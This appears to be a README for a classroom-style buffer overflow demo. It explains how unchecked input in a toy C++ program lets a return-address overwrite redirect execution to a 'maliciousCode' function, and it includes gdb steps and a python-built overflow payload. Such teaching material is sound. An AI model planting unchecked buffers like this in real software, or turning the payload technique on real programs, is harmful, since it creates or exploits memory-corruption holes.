# How it Works

Main function calls "printer" to print out cmd arguments. No check on input 
size leaves room for buffer overflow. To take advantage
the hacker just has to change the address of the return pointer so another 
function is executed instead of returning to main. This can be achieved by 
providing the address of the specified function.

#Working Instance

This ran successfuly on my laptop running Ubuntu 18.04 LTS.

# Instructions

1. Compile bufferOverload.cpp file with 'g++ -g -fno-stack-protector -z execstack' flags

2. Run gdb [name compiled file]

3. Do "disas maliciousCode" and find the push address for the maliciousCode function

4. To perform overload while in gdb "run $(python -c 'print "z"*18 + "\xda\x46\x55\x55\x55\x55"')"
Replace the address with the address found in step 3. My system uses little-endian so it's in reverse

5. Expected output: maliciousCode function should run and output "Muhahahahah! I'm in! Also, Hello World"
It should also create a file which it populates with some info

Remember to change the address to match address of the macliciousCode function


# Software Specs

- Operating System: Ubuntu 18.4 LTS 64-bit
- Compiler: g++ 7.30
- Debugger: GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git 

# Hardware

- Laptop: Gateway NV54
- Processor: Pentium(R) Dual-Core CPU T4200 @ 2.00GHz × 2
